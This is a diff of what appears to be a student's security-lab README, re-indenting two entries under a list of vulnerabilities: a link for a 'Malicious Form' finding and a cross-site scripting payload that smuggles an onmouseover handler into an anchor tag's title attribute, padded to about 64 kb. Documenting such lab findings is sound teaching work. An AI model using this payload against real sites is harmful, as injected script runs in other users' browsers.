@@ -104,10 +104,10 @@ Time spent: 26 hours spent in total
 
 - 1st Vulnerability(Malicious Form):
 
-https://github.com/sanjanabintaazad/hello-world/blob/main/index.html
+      https://github.com/sanjanabintaazad/hello-world/blob/main/index.html
 - 3rd Vulnerability:
 
-`<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
+      `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
 
 
 ## Resources
